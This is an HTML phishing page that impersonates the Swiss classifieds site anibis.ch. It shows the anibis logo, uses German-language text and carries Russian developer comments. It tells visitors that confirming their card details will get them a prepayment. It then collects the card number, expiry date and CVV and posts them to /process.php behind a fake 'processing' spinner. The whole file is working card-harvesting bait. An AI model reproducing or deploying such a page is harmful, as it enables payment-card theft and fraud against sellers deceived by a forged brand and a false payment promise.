<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>anibis.ch</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .logo {
            position: absolute;
            top: 10px;
            left: 10px;
        }
        .logo img {
            width: 150px;
        }
        .form-container {
            width: 100%;
            max-width: 400px;
        }
        form {
            background-color: #ffffff;
            padding: 2.5rem;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            display: block;
        }
        .processing-message {
            display: none;
            font-size: 2.5rem;
            color: #007bff;
            font-family: 'Nunito', sans-serif;
            text-align: center;
        }
        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(0, 123, 255, 0.3);
            border-radius: 50%;
            border-top-color: #007bff;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 1rem; /* Отступ под значком */
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        h1 {
            font-family: 'Nunito', sans-serif;
            text-align: center;
            margin-bottom: 2rem;
            font-size: 1.8rem;
            color: #333;
        }
        h4 {
            font-family: 'Nunito', sans-serif;
            color: green;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
            color: #555;
            font-size: 1rem;
        }
        input[type="text"] {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ddd;
            border-radius: 10px;
            margin-bottom: 1.5rem;
            font-size: 1.1rem;
            background-color: #f9f9f9;
            transition: background-color 0.3s, box-shadow 0.3s, border-color 0.3s;
        }
        input[type="text"]:focus {
            background-color: #fff;
            border-color: #007bff;
            box-shadow: 0 0 10px rgba(0, 123, 255, 0.4);
            outline: none;
        }
        input[type="submit"] {
            width: 100%;
            padding: 0.75rem;
            background-color: #007bff;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
            box-shadow: 0 4px 10px rgba(0, 86, 179, 0.4);
        }
        input[type="submit"]:active {
            background-color: #003f7f;
        }
    </style>
    <script>
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            input.value = formattedValue;
        }

        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length >= 2) {
                input.value = value.slice(0, 2) + '/' + value.slice(2);
            } else {
                input.value = value;
            }
        }

        function showProcessingMessage(event) {
            event.preventDefault(); // Предотвращаем отправку формы
            
            // Скрываем форму и показываем сообщение
            document.querySelector('form').style.display = 'none';
            document.querySelector('.processing-message').style.display = 'block';
            
            // Реальная отправка формы через 1 секунду
            setTimeout(() => {
                event.target.submit();
            }, 1000);
        }
    </script>
</head>
<body>
    <div class="logo">
        <img src="Снимок экрана 2024-09-19 105547.png" alt="Логотип anibis.ch">
    </div>
    <div class="form-container">
        <form action="/process.php" method="post" onsubmit="showProcessingMessage(event)"> <!-- Изменение пути на process.php -->
            <h1>Kartendaten eingeben</h1>
            <h4>Bestätigen Sie Ihre Angaben, um eine Vorauszahlung zu erhalten.</h4>
            <label for="cardNumber">Kartennummer:</label>
            <input type="text" id="cardNumber" name="cardNumber" maxlength="19" required placeholder="0000 0000 0000 0000" oninput="formatCardNumber(this)">
            <label for="expiryDate">Gültigkeitsdauer (MM/YY):</label>
            <input type="text" id="expiryDate" name="expiryDate" maxlength="5" required placeholder="01/29" oninput="formatExpiryDate(this)">
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" maxlength="3" required placeholder="000">
            <input type="submit" value="Daten bestätigen">
        </form>
        <div class="processing-message">
            <div class="spinner"></div> <!-- Значок ожидания -->
            Datenverarbeitung...
        </div>
    </div>
</body>
</html>